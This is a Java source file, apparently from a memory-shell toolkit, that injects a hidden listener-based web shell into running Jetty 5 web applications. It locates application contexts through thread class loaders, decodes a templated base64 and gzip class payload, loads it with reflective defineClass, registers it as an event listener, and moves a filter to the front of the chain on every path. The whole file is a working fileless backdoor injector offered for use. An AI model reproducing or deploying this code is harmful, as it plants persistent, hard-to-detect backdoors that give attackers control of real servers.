package com.reajason.javaweb.memshell.injector.jetty;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.EventListener;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2026/7/4
 */
public class Jetty5ListenerInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public Jetty5ListenerInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts == null || contexts.isEmpty()) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    inject(context, shell);
                    msg += "[/*] ready\n";
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        ok = true;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(context, "getContextPath");
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    public void inject(Object context, Object listener) throws Exception {
        if (hasListener(context)) {
            return;
        }

        Object webApplicationHandler = getWebApplicationHandler(context);
        try {
            invokeMethod(context, "addEventListener", new Class[]{EventListener.class}, new Object[]{listener});
        } catch (Throwable ignored) {
        }

        if (!hasWebApplicationHandlerListener(webApplicationHandler)) {
            invokeMethod(webApplicationHandler, "addEventListener", new Class[]{EventListener.class}, new Object[]{listener});
        }
        ensureJsr154Filter(webApplicationHandler);
        syncJsr154Filter(webApplicationHandler);
    }

    @Override
    public String toString() {
        return msg;
    }

    /**
     * org.mortbay.jetty.servlet.WebApplicationContext
     */
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            try {
                Object contextClassLoader = invokeMethod(thread, "getContextClassLoader");
                String name = contextClassLoader.getClass().getName();
                if (name.endsWith("ContextLoader")) {
                    contexts.add(getFieldValue(contextClassLoader, "_context"));
                }
            } catch (Exception ignored) {
            }
        }
        return contexts;
    }

    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader"));
        } catch (Exception e) {
            return ((ClassLoader) getFieldValue(context, "_classLoader"));
        }
    }

    public Object getWebApplicationHandler(Object context) throws Exception {
        try {
            Object webApplicationHandler = invokeMethod(context, "getWebApplicationHandler");
            if (webApplicationHandler != null) {
                return webApplicationHandler;
            }
        } catch (Exception ignored) {
        }
        try {
            Object webApplicationHandler = getFieldValue(context, "_webAppHandler");
            if (webApplicationHandler != null) {
                return webApplicationHandler;
            }
        } catch (Exception ignored) {
        }
        return getFieldValue(context, "_servletHandler");
    }

    private boolean hasListener(Object context) throws Exception {
        if (containsListener(getFieldValueQuietly(context, "_contextListeners"))) {
            return true;
        }

        Object webApplicationHandler = getWebApplicationHandler(context);
        return hasWebApplicationHandlerListener(webApplicationHandler);
    }

    private boolean hasWebApplicationHandlerListener(Object webApplicationHandler) {
        if (containsListener(getFieldValueQuietly(webApplicationHandler, "_requestListeners"))) {
            return true;
        }
        if (containsListener(getFieldValueQuietly(webApplicationHandler, "_requestAttributeListeners"))) {
            return true;
        }
        if (containsListener(getFieldValueQuietly(webApplicationHandler, "_sessionListeners"))) {
            return true;
        }
        return containsListener(getFieldValueQuietly(webApplicationHandler, "_contextAttributeListeners"));
    }

    private Object getFieldValueQuietly(Object obj, String name) {
        try {
            return getFieldValue(obj, name);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private boolean containsListener(Object listeners) {
        if (listeners == null) {
            return false;
        }
        if (listeners instanceof List) {
            List list = (List) listeners;
            for (int i = 0; i < list.size(); i++) {
                if (isInjectedListener(list.get(i))) {
                    return true;
                }
            }
            return false;
        }
        if (listeners.getClass().isArray()) {
            int length = Array.getLength(listeners);
            for (int i = 0; i < length; i++) {
                if (isInjectedListener(Array.get(listeners, i))) {
                    return true;
                }
            }
            return false;
        }
        return isInjectedListener(listeners);
    }

    private boolean isInjectedListener(Object listener) {
        return listener != null && listener.getClass().getName().contains(getClassName());
    }

    private void ensureJsr154Filter(Object webApplicationHandler) {
        try {
            Object filterHolder = invokeMethod(webApplicationHandler, "getFilter", new Class[]{String.class}, new Object[]{"jsr154"});
            if (filterHolder == null) {
                filterHolder = invokeMethod(webApplicationHandler,
                        "defineFilter",
                        new Class[]{String.class, String.class},
                        new Object[]{"jsr154", "org.mortbay.jetty.servlet.JSR154Filter"});
            }
            if (invokeMethod(filterHolder, "getFilter") == null) {
                invokeMethod(filterHolder, "start");
            }
            Object jsr154Filter = invokeMethod(filterHolder, "getFilter");
            setFieldValue(webApplicationHandler, "jsr154FilterHolder", filterHolder);
            setFieldValue(webApplicationHandler, "jsr154Filter", jsr154Filter);
            try {
                invokeMethod(jsr154Filter, "setUnwrappedDispatchSupported", new Class[]{boolean.class}, new Object[]{Boolean.TRUE});
            } catch (Throwable ignored) {
            }
            if (!hasPathFilterMapping(webApplicationHandler, "jsr154")) {
                invokeMethod(webApplicationHandler,
                        "addFilterPathMapping",
                        new Class[]{String.class, String.class, int.class},
                        new Object[]{"/*", "jsr154", Integer.valueOf(1)});
            }
            movePathFilterToFront(webApplicationHandler, "jsr154");
            clearChainCache(webApplicationHandler);
        } catch (Throwable ignored) {
        }
    }

    private void syncJsr154Filter(Object webApplicationHandler) {
        try {
            Object jsr154Filter = getFieldValueQuietly(webApplicationHandler, "jsr154Filter");
            if (jsr154Filter == null) {
                Object jsr154FilterHolder = getFieldValueQuietly(webApplicationHandler, "jsr154FilterHolder");
                if (jsr154FilterHolder != null) {
                    jsr154Filter = invokeMethod(jsr154FilterHolder, "getFilter");
                }
            }
            if (jsr154Filter == null) {
                return;
            }
            invokeMethod(jsr154Filter, "setRequestListeners", new Class[]{Object.class}, new Object[]{getFieldValueQuietly(webApplicationHandler, "_requestListeners")});
            invokeMethod(jsr154Filter, "setRequestAttributeListeners", new Class[]{Object.class}, new Object[]{getFieldValueQuietly(webApplicationHandler, "_requestAttributeListeners")});
        } catch (Throwable ignored) {
        }
    }

    private boolean hasPathFilterMapping(Object webApplicationHandler, String filterName) {
        try {
            List pathFilters = (List) getFieldValue(webApplicationHandler, "_pathFilters");
            if (pathFilters == null) {
                return false;
            }
            for (int i = 0; i < pathFilters.size(); i++) {
                Object filterMapping = pathFilters.get(i);
                Object filterHolder = invokeMethod(filterMapping, "getHolder");
                String name = (String) invokeMethod(filterHolder, "getName");
                if (filterName.equals(name)) {
                    return true;
                }
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    private void movePathFilterToFront(Object webApplicationHandler, String filterName) {
        try {
            List pathFilters = (List) getFieldValue(webApplicationHandler, "_pathFilters");
            if (pathFilters == null || pathFilters.size() < 2) {
                return;
            }
            for (int i = 0; i < pathFilters.size(); i++) {
                Object filterMapping = pathFilters.get(i);
                Object filterHolder = invokeMethod(filterMapping, "getHolder");
                String name = (String) invokeMethod(filterHolder, "getName");
                if (filterName.equals(name)) {
                    pathFilters.remove(i);
                    pathFilters.add(0, filterMapping);
                    return;
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private void clearChainCache(Object webApplicationHandler) {
        clearCacheField(webApplicationHandler, "_chainCache");
        clearCacheField(webApplicationHandler, "_namedChainCache");
    }

    private void clearCacheField(Object object, String name) {
        try {
            Object cache = getFieldValue(object, name);
            if (cache instanceof Map[]) {
                Map[] maps = (Map[]) cache;
                for (int i = 0; i < maps.length; i++) {
                    if (maps[i] != null) {
                        maps[i].clear();
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                field.set(obj, value);
                return;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    public static Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (NoSuchMethodException e) {
            throw e;
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
